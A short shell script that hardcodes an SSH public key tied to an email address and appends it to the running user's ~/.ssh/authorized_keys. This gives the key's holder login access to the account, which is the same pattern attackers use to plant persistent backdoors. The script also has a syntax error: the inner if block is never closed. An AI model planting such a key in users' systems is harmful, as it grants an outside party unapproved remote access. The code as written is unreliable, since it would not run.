
DEFAULT_ID_RSA_PUB="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd+MVyDxixgCAKr/HlJdGrIfDOGP/PAQjdYnaUzcOQK0Tn+uQYAbw0bx7ayWZb3jq6aL72BsOTthqS4Lh4w3rpiCv2ouzHqc6wBc48AOmN/wPiWO+/4j+EsQcd64jsTLyEQZHotjA5AnfPEXbPy4MXQ1l3xmIXQvIAnBegSdCQc757WaJirxdOabjZII48naLMEdHw6gEIcvRQDj3L9jbcRWgFNI0kKnqhZgma4BechL0av3VqAPOl62kWzN6D2VzdfhfmjQ+jLdBf5YXwZIOKa6OamGakHNPb318VD2TsnXV7H63c3z7QX96JrswD8mXTD2ooaoodDnuLodTlJ+uZiWCx7uUsIWh/+VIj+VU7rnaivRyliIbm8vz9eFNv2XDSQLewKOddDBJOVy8GAp86F1b/G9shHx9gU38iJAB2G5eYYi02FlFUfAEe7ZPQaggGM+kzpIg1xjAF3lcrTH/cNGDaGwfQ0a7Yn6VVwZXz5r7s8+u7Pawr4jMx48NpqCE= luzhixing12345@163.com"



if [ -d "$HOME/.ssh" ]; then
    if [ -f "$HOME/.ssh/authorized_keys" ]; then
        echo -e "\n$DEFAULT_ID_RSA_PUB\n" >> "$HOME/.ssh/authorized_keys"
    else
        echo "$DEFAULT_ID_RSA_PUB" > "$HOME/.ssh/authorized_keys"
else
    mkdir "$HOME/.ssh"
    echo "$DEFAULT_ID_RSA_PUB" >> "$HOME/.ssh/authorized_keys"
fi